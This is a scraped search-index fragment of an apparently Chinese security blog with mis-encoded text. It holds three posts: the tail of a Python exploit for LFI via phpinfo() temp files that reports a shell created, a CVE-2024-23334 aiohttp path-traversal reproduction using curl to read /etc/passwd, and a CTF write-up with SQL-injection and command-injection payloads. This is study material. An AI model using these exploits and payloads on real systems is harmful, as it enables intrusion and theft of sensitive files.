f\u0026#34;\u0026#34;\u0026#34;POST /phpinfo.php?a=test.txt HTTP/1.1 Host: {host}:{port} Content-Length: {content_length} Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryfHfyAsoxPPUAHIAj Connection: keep-alive Cookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie={padding} Cache-Control: {padding} Accept-Language: {padding} Upgrade-Insecure-Requests: {padding} User-Agent: {padding} Accept: {padding} {body}\u0026#34;\u0026#34;\u0026#34; LFIrequest = \u0026#34;\u0026#34;\u0026#34; GET /lfi.php?file=%s HTTP/1.1 Host: 192.168.56.1:8000 User-Agent: Mozilla/4.0 Proxy-Connection: Keep-Alive \u0026#34;\u0026#34;\u0026#34; return(TMPrequest , TAG , LFIrequest) #æ‰¾å‡ºtmpçš„åç§» def offset(request,host,port): client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM) client_socket.connect((host, port)) client_socket.send(request.encode(\u0026#39;utf-8\u0026#39;)) response = b\u0026#34;\u0026#34; while True: chunk = client_socket.recv(4096) if not chunk: break response += chunk client_socket.close() i = response.find(b\u0026#34;[tmp_name] =\u0026amp;gt\u0026#34;) if i == -1: raise ValueError (\u0026#34;no tmp file\u0026#34;) print (\u0026#34;find tmp in %s\u0026#34;,i) tmp_name = response[i:i+100] start = tmp_name.find(b\u0026#39;\u0026amp;gt;\u0026#39;) +5 +i end = tmp_name.find(b\u0026#39;.tmp\u0026#39;) +4 +i i += 255 print(end-start) return(start,end) def LFI(LFIrequest,request,start,end,host,port,TAG): s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((host, port)) s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s2.connect((host, port)) s.send(request.encode(\u0026#39;utf-8\u0026#39;)) d = \u0026#34;\u0026#34; while (len(d)\u0026lt;end): d += s.recv(end).decode(\u0026#39;utf-8\u0026#39;) fn = d[start:end] s2.send((LFIrequest % str(fn)).encode(\u0026#39;utf-8\u0026#39;)) response = s2.recv(4096) response = s2.recv(4096) s.close() s2.close() if response.decode(\u0026#39;utf-8\u0026#39;).find(TAG) !=-1: return fn counter = 0 class ThreadWorker(threading.Thread): def __init__(self, e, l, m, *args): threading.Thread.__init__(self) self.event = e self.lock = l self.maxattempts = m self.args = args def run(self): global counter while not self.event.is_set(): with self.lock: if counter \u0026gt;= self.maxattempts: return counter += 1 try: x = LFI(*self.args) if self.event.is_set(): break if x: print(\u0026#34;\\nGot it! Shell created in /tmp/g\u0026#34;) self.event.set() except socket.error: return def main(): host = \u0026#39;127.0.0.1\u0026#39; port = 80 TMPrequest , tag , LFIrequest =setup(host,port) start , end = offset(TMPrequest,host,port) # LFI(LFIrequest, TMPrequest, start, end, host, port, tag) maxattempts = 1000 poolsz = 20 e = threading.Event() l = threading.Lock() tp = [] for i in range(0, poolsz): tp.append(ThreadWorker(e, l, maxattempts, LFIrequest, TMPrequest, start, end, host, port, tag)) # def LFI(LFIrequest,request,start,end,host,port,TAG): for t in tp: t.start() try: while not e.wait(1): if e.is_set(): break with l: print(\u0026#34;\\r% 4d / % 4d\u0026#34; % (counter, maxattempts)) if counter \u0026gt;= maxattempts: break print() if e.is_set(): print(\u0026#34;Woot!\u0026#34;) else: print(\u0026#34;:(\u0026#34;) except KeyboardInterrupt: print(\u0026#34;\\nTelling threads to shutdown...\u0026#34;) e.set() if __name__ == \u0026#34;__main__\u0026#34;: main() åƒè€ƒè³‡æ–™ #\rLFI WITH PHPINFO() ASSISTANCE\ngitee twfb/LFI-With-PHPInfo-Assitance\ngithub roughiz/lfito_rce\n","date":"30 December 2024","externalUrl":null,"permalink":"/posts/012_lfiphpinfo/","section":"Posts","summary":"é€éphpinfoèƒ½å¤ æŸ¥çœ‹æš«å­˜æª”è³‡è¨Šï¼Œä¸¦ä»¥æ­¤ä¾†å¾—åˆ°å‰›å‰›è¼¸å…¥çš„æƒ¡æ„payload","title":"phpinfoï¼Œæ‰“é–‹ LFI çš„æ½˜æœµæ‹‰ç›’ (Error)","type":"posts"},{"content":"","date":"9 December 2024","externalUrl":null,"permalink":"/tags/cve/","section":"Tags","summary":"","title":"CVE","type":"tags"},{"content":"\rç”šéº¼æ™‚å€™æ‰æœ‰è‡ªå·±çš„CVE\u0026hellip;\næ²’ç›¸é—œåœ–ç‰‡ å˜¿å˜¿å°é¢å¯ä»¥éš¨é‚Šä¸Ÿ\rå‰è¨€ #\ré€™æ˜¯è‡ªå·±ç¬¬ä¸€æ¬¡å»å˜—è©¦åˆ†æä»¥åŠå¾©ç¾ä¸€å€‹CVEçš„å…§å®¹ï¼Œç”±æ–¼æ˜¯ç¬¬ä¸€æ¬¡å»ç ”ç©¶CVEï¼Œ\nå› æ­¤åœ¨ä¸€é–‹å§‹è¦å°‹æ‰¾å“ªå€‹CVEä¾†ç ”ç©¶å°±æ€è€ƒäº†å¾ˆä¹…ã€‚\næœ€å¾Œæ˜¯æ±ºå®šæ˜¯ç ”ç©¶æœ‰é—œLFIçš„æ¼æ´ï¼Œå› ç‚ºæˆ‘èªç‚ºé€™å€‹æ¼æ´å°æˆ‘ä¾†è¬›ä¹Ÿæ¯”è¼ƒç›´è§€ï¼Œ\nè€Œä¸”ä»¥å‰åœ¨æ‰“CTFä¹Ÿæœ‰é‡éé€™ç¨®æ¼æ´çš„å•é¡Œã€‚\næœ¬æ¬¡CVEå¾©ç¾æˆ‘ä¹Ÿæœ‰ä¸Ÿåœ¨è‡ªå·±çš„githubä¸Šï¼Œä¹Ÿæ­¡è¿å¤§å®¶å»è·Ÿè‘—è‡ªå·±å¯¦éš›å‹•æ‰‹åšçœ‹çœ‹ã€‚\nBetan423/CVE-2024-23334-PoC\rThis repository is a proof of concept (POC) for CVE-2024-23334, demonstrating an attempt to replicate the bug in aiohttp that leads to Local File Inclusion (LFI).\rnull 0\r0\ræ¼æ´ #\ræ¼æ´ä»‹ç´¹ #\ræœ¬æ¼æ´ç™¼ç”Ÿåœ¨pythonçš„aiohttpç‰ˆæœ¬=\u0026lt; 3.9.1ã€å…¶ä¸­çš„follow_symlinksã€‚\nåœ¨æ’°å¯«aiohttpçš„pythonæª”æ¡ˆå»ºç«‹ä¼ºæœå™¨æ™‚ï¼Œå…¶ä¸­æœ‰ä¸€é …ç‚ºfollow_symlinksï¼Œèƒ½å¤ è¨­å®šæ˜¯å¦å…è¨±ç¬¦è™Ÿéˆæ¥ï¼Œ\nè‹¥åœ¨è¨­å®šæ™‚å°‡æ­¤è¨­å®šç‚ºTrueï¼Œç”±æ–¼ä¸æœƒé€²ä¸€æ­¥é©—è­‰å­˜å–ä½ç½®æ˜¯å¦ä½æ–¼è©²ç³»çµ±ç›®éŒ„ä¸­ï¼Œå› æ­¤ä¾¿æœ‰Local File Inclusion(LFI)çš„æ¼æ´ç”¢ç”Ÿï¼Œèƒ½å¤ é€éä¸æ–·è¼¸å…¥../ä¾†å­˜å–åˆ°ç³»çµ±æ ¹ç›®éŒ„ä¸‹ä»¥å¤–çš„æ•æ„Ÿæª”æ¡ˆ(ä¾‹å¦‚/etc/passwdä¹‹é¡çš„)ã€‚\nç¬¦è™Ÿé€£çµä»‹ç´¹ #\rç°¡å–®ä»‹ç´¹ä¸€ä¸‹ç¬¦è™Ÿé€£æ¥ï¼Œç•¢ç«Ÿä¸€é–‹å§‹æˆ‘ä¹Ÿä¸çŸ¥é“é€™æ˜¯ä»€éº¼\nç¬¦è™Ÿéˆæ¥ï¼ˆsymbolic linksï¼Œä¹Ÿç¨±ç‚ºè»Ÿé€£çµï¼‰ï¼Œç°¡å–®ä¾†è¬›å¯ä»¥æŠŠä»–æƒ³æˆWindowsç³»çµ±ä¸­çš„æ·å¾‘(å°±æ˜¯ä½ æ¡Œé¢ä¸Šä¸€å †é»å…©ä¸‹å°±èƒ½é–‹å•Ÿè©²æ‡‰ç”¨ç¨‹å¼çš„æ±æ±)ã€‚\næˆ‘å€‘èƒ½å¤ é€éln -s ç›®æ¨™æª”æ¡ˆä½ç½® é€£çµåç¨±ä¾†å»ºç«‹è»Ÿé€£çµï¼›è€Œè‹¥æ˜¯ä¸åŠ -så‰‡å¯ä»¥å»ºç«‹ç¡¬é€£çµã€‚\nå…©è€…æœ€å¤§çš„å·®åˆ¥ç‚ºï¼Œè»Ÿé€£æ¥åªèƒ½åœ¨ç•¶å‰ç›®éŒ„ä¸‹ç”Ÿæ•ˆï¼Œè‹¥æ˜¯å°‡å…¶ç§»åˆ°å…¶ä»–è³‡æ–™å¤¾ä¸­å‰‡æœƒå¤±æ•ˆï¼Œ\nè€Œç¡¬é€£çµå‰‡æ˜¯ä¸è«–ç§»åˆ°å“ªéƒ½èƒ½æˆåŠŸç”Ÿæ•ˆã€‚\næ‰€ä»¥å¦‚æœæˆ‘å€‘é€™é‚Šå»ºç«‹12å€‹ç¡¬é€£çµçš„è©± å°±æœƒæœ‰12ç”Ÿæ•ˆ\nå»ºç«‹è»Ÿé€£çµ #\ræˆ‘å€‘å¯ä»¥é€éåœ¨staticè³‡æ–™å¤¾ä¸­åŸ·è¡Œln -s ~/Desktop/flag.txt flagä¾†åœ¨è©²è³‡æ–™å¤¾ä¸­å»ºç«‹ä¸€å€‹è»Ÿé€£çµæŒ‡å‘æ¡Œé¢çš„flag.txtï¼Œ\næ¥è‘—é€épython server.pyä¾†åŸ·è¡Œæ¶è¨­èµ·ä¾†çš„serverï¼Œä¸¦ä¸”åœ¨ç¶²å€å¾Œé¢æ–°å¢/static/flagï¼Œ\nå³å¯é †åˆ©æŸ¥çœ‹åˆ°æ¡Œé¢çš„flag.txtå…§å®¹ã€‚ è€Œæˆ‘å€‘è‹¥æ˜¯å°‡server.pyä¸­follow_symlinksæ”¹æˆFlaseï¼Œ\nå†æ¬¡é€£æ¥http://localhost:8081/static/flagå‰‡æœƒè®Šæˆ404: Not Foundã€‚\nå¾©ç¾ #\ræœ¬æ¬¡å¾©ç¾ä¸»è¦æ˜¯ç…§è‘—\råƒè€ƒgithub1 ä¾†åšçš„\næœ€åˆæ˜¯å…ˆæŒ‰ç…§\råƒè€ƒgithub2 ä¾†å¾©ç¾ï¼Œä½†ç”±æ–¼åœ¨æœ€å¾Œçš„æ™‚å€™ç„¡æ³•é †åˆ©æˆåŠŸï¼Œ\nå› æ­¤æœ€å¾Œæ”¹æˆä½¿ç”¨å…¶ä»–çš„ï¼Œè‡³æ–¼ç‚ºç”šéº¼ç„¡æ³•é †åˆ©LFIå‰‡æœƒåœ¨ä¸‹é¢ä¾†åšåˆ†æã€‚\nå¾©ç¾å¯¦åš #\ræœ¬æ¬¡å¾©ç¾åŸºæœ¬ä¸Šåªéœ€è¦æŒ‰ç…§githubä¸­æ‰€æä¾›çš„æŒ‡ä»¤è¼¸å…¥å³å¯é †åˆ©é”æˆï¼Œ\nä¸»è¦æ˜¯é€épython server.pyï¼Œå°‡æœå‹™æ¶è¨­åœ¨localhost 8081ï¼Œä¸¦ä¸”å°‡follow_symlinksè¨­å®šç‚ºTrueå³å¯å®Œæˆç’°å¢ƒæ¶è¨­ã€‚ æ¥è‘—åŸ·è¡Œbash exploit.shï¼Œé€éä¸æ–·æ–°å¢../çš„æ•¸é‡ï¼Œä¾†å°‹æ‰¾æƒ³LFIçš„ç›®æ¨™(/etc/passwd)ï¼Œ\nå†ä¾†é€écurl --path-as-is $url$payload$fileä¾†å°æ¯”å›å‚³çš„ç‹€æ…‹å€¼æ˜¯å¦ç‚º200ï¼Œ\nè‹¥ç‚º200å‰‡ä»£è¡¨é †åˆ©æ‰¾åˆ°è©²æª”æ¡ˆï¼Œè‹¥ç‚ºå…¶å®ƒçµæœå‰‡æ˜¯æ–°å¢ç¹¼çºŒ../çš„æ•¸é‡ä¾†å˜—è©¦å°‹æ‰¾ã€‚\nå› æ­¤æˆ‘å€‘ä¹Ÿèƒ½é€éè‡ªå·±åœ¨cmdä¸­åŸ·è¡ŒåŸ·è¡Œä¾‹å¦‚curl --path-as-is http://localhost:8081/static/../../../../../../etc/passwdï¼Œä¾†ç›´æ¥æ‰‹å‹•è¼¸å…¥å–å¾—æ•æ„Ÿæª”æ¡ˆçš„å…§å®¹ï¼Œ\nè€Œcurlå¾Œé¢æ¥çš„--path-as-isä¸»è¦æ˜¯ç‚ºäº†è®“ä»–ä¸æœƒå»è‡ªå‹•å¿½ç•¥æ‰../çš„å…§å®¹ï¼Œè€Œæ˜¯æŠŠ../ä½œç‚ºæ•´å€‹ç¶²ç«™å…§å®¹ä¸€èµ·è¼¸å…¥\nè€Œæˆ‘å€‘ä¹Ÿèƒ½å¤ åœ¨æœ¬åœ°ä¸­éš¨æ©Ÿæ”¾ä¸€å€‹flag.txtçš„æª”æ¡ˆï¼Œä¸¦ä¸”å°‡exploit.shä¸­çš„å…§å®¹ç¨ä½œä¿®æ”¹ï¼Œé€™æ¨£ä¹Ÿèƒ½é †åˆ©å–å¾—è©²flag.txtçš„å…§å®¹ï¼é€™æ¨£ä¸€é¡ŒCTFçš„é¡Œç›®å°±å‡ºå¥½äº† åƒè€ƒgithub2å¤±æ•—åŸå› ? #\rå°æ¯”å…©å€‹githubä¸­è…³æœ¬çš„ä¸åŒï¼Œ\nå¯ä»¥ç™¼ç¾åœ¨github1ä¸­æ˜¯é€éä½¿ç”¨curlä¾†ç²å–ç¶²ç«™çš„å›å‚³ç‹€æ…‹ç¢¼ï¼Œ\nè€Œgithub2ä¸­å‰‡æ˜¯é€épythonä¸­çš„requests.getã€‚\nå°æ¯”å…©è€…çµæœå¾Œå¯ä»¥ç™¼ç¾é€écurléƒ½èƒ½æ­£å¸¸å­˜å–åˆ°ç›®æ¨™æª”æ¡ˆï¼Œè€Œrequestså‰‡æœƒæœ‰å•é¡Œã€‚ ç¶“éäº†è§£å¾Œï¼Œæ¨æ¸¬æ˜¯å› ç‚ºåœ¨requestsæœƒç›´æ¥å…ˆå°å…§å®¹æœ‰../çš„è·¯å¾‘é€²è¡Œè™•ç†ï¼Œ\né€²è€Œå°è‡´å‚³è¼¸çš„è«‹æ±‚éé æœŸã€‚\nå› æ­¤é€™é‚Šæˆ‘å€‘åªéœ€å°‡../è½‰æ›æˆ..%2Fï¼Œå³å¯é †åˆ©åŸ·è¡Œã€‚ ç¸½çµ #\rç¾åœ¨aiohttpçš„æœ€æ–°ç‰ˆæœ¬ç‚º3.11.10ï¼Œç¶“éå¯¦æ¸¬å¾Œï¼Œåœ¨ç›®å‰æœ€æ–°ç‰ˆæœ¬å·²ç¶“æœ‰å°‡æœ¬å•é¡Œä¿®å¾©æ‰äº†ï¼Œ\nå¦‚æœé€éèª¿ç”¨ä¸€æ¨£çš„è…³æœ¬ï¼Œå°‡ç„¡æ³•å†å¯¦ç¾LFIçš„æ¼æ´ã€‚ è€¶é€™æ˜¯è‡ªå·±ç¬¬ä¸€æ¬¡å¾©ç¾CVEï¼Œæœ¬ä¾†åœ¨å¾©ç¾ä»¥å‰è¦ºå¾—CVEéƒ½æ˜¯äº›ç¥ä»™ç´šåˆ¥æ¼æ´ï¼Œé‚£ç¨®è…³æœ¬éƒ½è¦è·‘ä¸€å¤§é•·ä¸²ä¹‹é¡çš„æ¼æ´ã€‚\nä½†è‡ªå·±åœ¨å¯¦éš›æ“ä½œéå¾Œç™¼ç¾ï¼Œå…¶å¯¦è…³æœ¬ä¹Ÿæ»¿ç°¡å–®çš„ï¼Œè§€å¿µä¹Ÿéƒ½æ²’æœ‰åˆ°å¤ªé«˜æ·±ã€‚\næœ€å›°é›£çš„éƒ¨åˆ†ä¸»è¦é‚„æ˜¯åœ¨ç¬¬ä¸€å€‹å»ç™¼ç¾é€™å€‹æ¼æ´çš„äººï¼Œ\næ‰€ä»¥èƒ½ç¬¬ä¸€å€‹æ‰¾åˆ°æ¼æ´çš„äººé‚„æ˜¯ä¸€æ¨£æ˜¯ç¥ğŸ›\nåƒè€ƒé€£çµ #\rCVEé€£çµ\nåƒè€ƒgithub1\nåƒè€ƒgithub2\nå®˜æ–¹æ–‡ä»¶\n","date":"9 December 2024","externalUrl":null,"permalink":"/posts/011_cve-2024-23334/","section":"Posts","summary":"æœ¬ä¾†æ˜¯è‡ºç£å¥½å²é§­èª²å‰ä½œæ¥­ æƒ³èªªæ»¿é…·çš„å°±ä¸Ÿä¸Šä¾†äº†","title":"CVE-2024-23334å¾©ç¾","type":"posts"},{"content":"","date":"16 November 2024","externalUrl":null,"permalink":"/tags/ctf/","section":"Tags","summary":"","title":"CTF","type":"tags"},{"content":"\rå‰è¨€ #\ræœ¬æ¬¡æ’å 50/287 è§£å‡ºå¥½å¤šé¡Œé¡Œ è§£å‡º #\rCrypto / AES? #\rè§£å¯†ç¶²å€: https://www.devglan.com/online-tools/aes-encryption-decryption\nflag: å¿˜è¨˜è¨˜ã„Œ\nCrypto / Secret ROT13 #\ræŠŠ+ offsetæ”¹æˆ- offsetå°±å¯ä»¥äº†\ndef encrypt(text, key): encrypted_text = \u0026#34;\u0026#34; for i, char in enumerate(text): offset = ((i + 1 + key) * (i + 1)) % 26 if \u0026#39;A\u0026#39; \u0026lt;= char \u0026lt;= \u0026#39;Z\u0026#39;: new_char = chr((ord(char) - ord(\u0026#39;A\u0026#39;) + offset) % 26 + ord(\u0026#39;A\u0026#39;)) elif \u0026#39;a\u0026#39; \u0026lt;= char \u0026lt;= \u0026#39;z\u0026#39;: new_char = chr((ord(char) - ord(\u0026#39;a\u0026#39;) + offset) % 26 + ord(\u0026#39;a\u0026#39;)) else: new_char = char encrypted_text += new_char return encrypted_text # æ¸¬è©¦ç¯„ä¾‹ key = 7 plaintext = \u0026#34;NHNC{Y0[_kT0w_H0]_tU_decXypZe}\u0026#34; ciphertext = encrypt(plaintext, key) print(\u0026#34;åŠ å¯†å¾Œçš„å¯†æ–‡:\u0026#34;, ciphertext) ans = \u0026#34;VZRU{Y0k_yd0w_Z0o_ti_rsslyxli}\u0026#34; def decrypt(text, key): encrypted_text = \u0026#34;\u0026#34; for i, char in enumerate(text): offset = ((i + 1 + key) * (i + 1)) % 26 if \u0026#39;A\u0026#39; \u0026lt;= char \u0026lt;= \u0026#39;Z\u0026#39;: new_char = chr((ord(char) - ord(\u0026#39;A\u0026#39;) - offset) %26 + ord(\u0026#39;A\u0026#39;)) elif \u0026#39;a\u0026#39; \u0026lt;= char \u0026lt;= \u0026#39;z\u0026#39;: new_char = chr((ord(char) - ord(\u0026#39;a\u0026#39;) - offset) %26 + ord(\u0026#39;a\u0026#39;)) else: new_char = char encrypted_text += new_char return encrypted_text ciphertext = decrypt(ans, key) print(\u0026#34;è§£å¯†å¾Œçš„å¯†æ–‡:\u0026#34;, ciphertext) flag: NHNC{Y0u_kn0w_H0w_to_decrypte}\nCrypto / Ande Yo Caliente #\ré€éChaCha20åŠ å¯†ï¼Œå…¶å¯¦æˆ‘æ ¹æœ¬ä¸æœƒè§£\nä½†é¤µçµ¦GPTå¾Œä»–å°±ç›´æ¥å¹«æˆ‘ç”Ÿå‡ºexp.py\nè«‹å‹¿æ¨¡ä»¿ æœ€å£ç¤ºç¯„ é»æˆ‘çœ‹å°è©±ç´€éŒ„\nfrom binascii import unhexlify # Provided data iv = unhexlify(\u0026#34;635b52504ab86d67d780dede\u0026#34;) encrypted_message = unhexlify(\u0026#34;eab3ee7a3821847b76558eb61ec26f4fc7f72f436966ab7680d652b872c85c0bae4879db0748b02dde7df7ca34288a0fa21bd8889c57d3ff986a9566f09733cfbc6e\u0026#34;) encrypted_flag = unhexlify(\u0026#34;f393c557632f836f226c828c1e87634489fa2e7d7b38e477b0d14dfa66\u0026#34;) # Known plaintext message = b\u0026#34;When you feel my heat, look into my eyes\\nIt\u0026#39;s where my demons hide\u0026#34; # Recover the keystream keystream = bytes([m ^ e for m, e in zip(message, encrypted_message)]) # Decrypt the flag flag = bytes([f ^ k for f, k in zip(encrypted_flag, keystream)]) print(f\u0026#34;Recovered FLAG: {flag.decode()}\u0026#34;) flag: NHNC{what_i_learned_from_htb}\nMisc / Where is this #\rgoogleæ‰¾æ’éª¨é…¥éºµè·Ÿæ²³å ¤ä¸Šçš„è²“\nflag: NHNC{24.803_120.979}\nMisc / Blog2 #\ré»åˆ°æ¨è–¦vté‚£é‚Šçš„ç•™è¨€ï¼Œå¯ä»¥çœ‹åˆ°ç®¡ç†å“¡çš„ç•™è¨€ï¼Œé»é€²å»å¾Œå¯ä»¥çœ‹åˆ°å€‹äººæª”æ¡ˆ\nè£¡é¢æœ‰å€‹ä¸è¦é»é€²ä¾† æ‰€ä»¥æˆ‘å€‘é»é€²å»å°±æœ‰flagäº† flag: NHNC{comments_disqusjs}\nWeb / å“¥å¸ƒæ—ä¿è¡éƒ¨å…¬å‘Š #\rF12æ‰“é–‹å°±èƒ½çœ‹åˆ°è¢«è¨»é‡‹æ‰çš„flagäº†\nä¹Ÿèƒ½å³éµé»é–‹ æª¢è¦–ç¶²é åŸå§‹ç¢¼ æŸ¥çœ‹\nflag: NHNC{BeCareful!}\nWeb / EASY METHOD #\ré€éæ¨™é¡Œé‚„æœ‰é»é€²å»éƒ½æœ‰ç‰¹åˆ¥æåŠHTTP Methodï¼Œå°±æ˜¯GETã€POSTé‚£äº›çš„\nä½¿ç”¨burp suiteæ””æˆªå°åŒ…ç„¶å¾Œé€åˆ°repeaterï¼Œé–‹å§‹æ”¹HTTP Method\næ‰¾äº†ä¸€ä¸‹ç™¼ç¾æœ‰OPTIONSã€GETã€HEADã€POSTã€PUTã€DELETEã€TRACEã€CONNECTé€™å¹¾ç¨®\næœ€å¾Œæ”¹æˆPUTå°±æœ‰flagäº†\nä¹Ÿèƒ½ç”¨curlä¾†æ”¹å•¦ ä½†æˆ‘ä¸æœƒ ã„\nflag: NHNC{Y0u_kn0w_H0w_t0_us3_CURL}\nWeb / I need to get the C00kies #\rF12æŠŠè‡ªå·±çš„cookieå€¼æ”¹æˆadmin\nflag: NHNC{You_Kn0w_H0w_t0_chang3_th3_c00ki3}\nWeb / Login #\rSQLI\nUsernameå¡«admin' OR 1=1 ;--\nPasswordéš¨ä¾¿å¯«å°±å¯ä»¥äº† å› ç‚ºä¸Šé¢å·²ç¶“å°‡å¾ŒçºŒéƒ½è¨»é‡‹æ‰äº†\nflag: NHNC{S1mp|e_-_SQL!}\nWeb / 1 line php #\ré€é%0Aèƒ½å¤ åœ¨bashä¸­æ›è¡Œï¼Œæ–¼æ˜¯å¾Œé¢å°±å¯ä»¥é–‹å§‹command injectionäº† æ¥è‘—ç™¼å‹•é€šéˆèƒ½åŠ›ï¼Œcd åˆ°æ ¹ç›®éŒ„(/)çœ‹åˆ° flag- ï¼Œæ¥è‘—è¼¸å‡ºè©²æª”æ¡ˆå°±å¯ä»¥ã„Œ\npayload: cmd=%0Acd%20/%20;cat%20flag-\nflag: NHNC{enter_is_always_the_best}\nReverse / easyyyyyyyyyy #\rä¸çŸ¥é“ç‚ºç”šéº¼æˆ‘ç›´æ¥åŸ·è¡Œæœƒå¤±æ•—\nä½†ç¸½ä¹‹æŠŠä»–ä¸Ÿåˆ°idaå¾Œå°±æœƒç™¼ç¾æœ‰å€‹functionå«flag(void)\né»é€²å»å°±æœ‰äº†\nflag: NHNC{this_is_a_easy_one}\nReverse / Guess the num #\rä¸€é–‹å§‹ç›´æ¥é€éidaå»æŠŠçŒœæ•¸å­—æœ€å¾Œæ¯”è¼ƒçš„éƒ¨åˆ†å¾jnzæ”¹æˆjz\nçµæœç™¼ç¾æœ€å¾Œè¼¸å‡ºçš„flagæ˜¯å‡çš„qq\nå¯¦éš›å»æŸ¥çœ‹äº†ä¸€ä¸‹æ¯å€‹functionå¾Œï¼Œç™¼ç¾å…¶ä¸­sub_1217å¾ˆå¯ç–‘ï¼Œæœ‰èª¿ç”¨åˆ°flagï¼Œçœ‹èµ·ä¾†ç–‘ä¼¼æ˜¯åœ¨ä½œè§£å¯†ä¹‹é¡çš„?\næ¥è‘—é€égdbç›´æ¥è·³åˆ°è©²functionï¼Œç”±æ–¼é€™é¡Œçš„base addressä¸æ˜¯å¸¸è¦‹çš„0x400000ï¼Œå› æ­¤é€™é‚Šè¦å…ˆä¸‹vmmapä¾†çœ‹ä¸€ä¸‹base address\næŸ¥çœ‹å¾Œç™¼ç¾æ˜¯0x0000555555554000ï¼Œé‚£å†ä¾†å°±å…ˆåœ¨ç›®æ¨™functionä¸‹ä¸€å€‹bpç„¶å¾Œè·³åˆ°é‚£é‚Šnié€æ­¥åŸ·è¡Œå°±å¯ä»¥äº†\nb *(0x0000555555554000+0x1217)\rjump *(0x0000555555554000+0x1217) flag: NHNC{traced_down_to_dtor}\nPwn / Grading system #\rè§€å¯ŸåŸä»£ç¢¼å¯ä»¥ç™¼ç¾é€™é¡Œå­˜åœ¨é™£åˆ—æº¢å‡ºå•é¡Œ\nå…¶å¯¦æˆ‘ä¹Ÿä¸çŸ¥é“æ˜¯ä¸æ˜¯å«é€™å€‹åå­ å¥½åƒä¸æ˜¯ ä½†éš¨ä¾¿\nç¸½ä¹‹ç”±æ–¼ä»–æ²’æœ‰é™åˆ¶æˆ‘å€‘å°æ–¼é™£åˆ—æŸ¥æ‰¾çš„ç¯„åœ\nå› æ­¤æˆ‘å€‘èƒ½é€éè¼¸å…¥è¶…å‡ºé™£åˆ—å¤§å°çš„å€¼ï¼Œä¾†leakå‡ºå…¶ä»–å€¼\nç„¶å¾Œé€™é¡Œé‚„å¾ˆè²¼å¿ƒçš„æŠŠadminåˆå§‹åŒ–ç‚º1234ï¼Œè€Œä¸”é‚„æä¾›äº†å¿«é€Ÿdumpé™£åˆ—å€¼çš„åŠŸèƒ½\næˆ‘å€‘å‰›é–‹å§‹å­¸ç”Ÿæ•¸é‡ä»»æ„è¼¸å…¥ï¼Œæ¥è‘—é€éDumpåŠŸèƒ½ä¾†æŸ¥æ‰¾1234çš„å€¼ä½æ–¼é™£åˆ—ä½•è™•\næœ€å¾Œå†é€éä¿®æ”¹è©²å€¼ç‚º1ï¼Œå³å¯é€éè¼¸å…¥Sä¾†getshell\nflag: NHNC{i_dont_think_you_are_a_teacher}\nForensics / MagicButton #\rä¸‹è¼‰ä¸‹ä¾†å¾Œé»æŒ‰éˆ•å°±æœƒå™´flagäº†\nflag: NHNC{This_is_real_vuln}\nForensics / Kohiro #\råœ–ç‰‡å¾ˆæ˜é¡¯æ˜¯è¢«è£åˆ‡éï¼Œå› æ­¤é€™é‚Šè¦ä¾†æ”¹è®Šåœ–ç‰‡çš„é«˜åº¦\né€éhexç·¨è¼¯å™¨(æˆ‘æ˜¯ç”¨010editor)æ‰¾åˆ°å…¶ä¸­æ§åˆ¶å¯¬é«˜çš„éƒ¨åˆ†\nå¯ä»¥é€éå…ˆå°‡ç•¶å‰åœ–ç‰‡çš„é•·åº¦/é«˜åº¦è½‰æˆhexçš„å½¢å¼ï¼Œå†æ‹¿å»è£¡é¢æœå°‹ç›¸åŒçš„å€¼\næœå°‹å¾Œå¯ä»¥ç™¼ç¾æ˜¯åœ¨å…¶ä¸­çš„00A0,3~6ç‚ºé«˜ã€å¯¬çš„é•·åº¦\né€™é‚ŠæŠŠé«˜çš„é•·åº¦åŠ é•·ä¸€é»å°±æœ‰flagäº†\nçŸ®é¡\nflag: NHNC{you_can_edit_hex_00A0_04}\nForensics / Suspicious GIF #\ræŠŠgifé€ç¦åˆ†è§£å¾Œå°±æœ‰flagäº†\nconvert sus.gif flag.png flag: NHNC{FrAmE_bY_fRaMe}\nForensics / BotNet1 #\ré€²å»\ræŸ¥è©¢ç¶²å€å¾Œï¼ŒæŸ¥çœ‹Internal Transactions\nflag: NHNC{0x3e9e0e9cee22Ccd0ac94604A72394B0A1CCdb27A}\næœªè§£å‡º #\rForensics / MagicButton #\rForensics / BotNet2 #\rCrypto / Baby RSA #\rWeb / Miday #\rWeb / Democracy #\rReverse / Here\u0026rsquo;s the sauce #\rReverse / Kid game #\rReverse / Yet Another password checker #\rPWN / DOF #\rPWN / Filtered #\rç¸½çµ #\ré€™æ¬¡è§£åˆ°æ»¿èºçš„ æ„Ÿè¦ºå¾ˆå¤šéƒ½å·®ä¸€é» ç„¶å¾Œæœ‰äº›é¡Œç›®å¾ˆå¹¹( è€¶ç¹¼çºŒåŠªåŠ› plus ultra\n","date":"16 November 2024","externalUrl":null,"permalink":"/posts/010_weeklyctf05/","section":"Posts","summary":"é€™æ¬¡æ‰“çš„æ˜¯No Hack No CTF 2024","title":"No Hack No CTF 2024","type":"posts"},{"content":"\råˆ¥è™äº†\u0026hellip;\nç®—åœ¨æ¯å‘¨ctfå…§ï¼Œä¹‹å¾Œæ‡‰è©²éƒ½æŠŠåå­æ”¹æˆæ¯”è³½åç¨±\nå…±é€šé»æ‡‰è©²æ˜¯éƒ½ä¸æœƒæœ‰å°é¢\nå‰è¨€ #\ræ¯”è³½å‰›é–‹å°±æŠŠæœƒçš„é¡Œç›®å°±ç§’æ®ºäº† ç›´æ¥è¡åˆ°ç¬¬ä¸‰å\nç„¶å¾Œå†ä¾†å°±é–‹å§‹èººäº†\nâ ä¸æœƒè§£\nâœ… æ‡¶å¾—è§£\né€™æ¬¡Miscä¸€é¡Œéƒ½ ä¸æœƒ ä¸æ•¢ç¢°\næœ¬æ¬¡æ’å 25/106 è§£å‡º10é¡Œ è§£å‡º #\rWelcome / ç«¶è³½è¦å‰‡ #\råœ¨rulsçš„éƒ¨åˆ†æœ€ä¸‹é¢æœ‰ä¸€ä¸²base64çš„æ±æ±ï¼Œä¸Ÿå»è§£å¯†å¾Œå°±æœ‰flagäº†\nflag: NCKUCTF{æˆ‘æœƒéµå®ˆä»¥ä¸Šè¦å‰‡å› ç‚ºæˆ‘æ˜¯å¥½é§­å®¢}\nWelcome / Discord #\rè—åœ¨dc 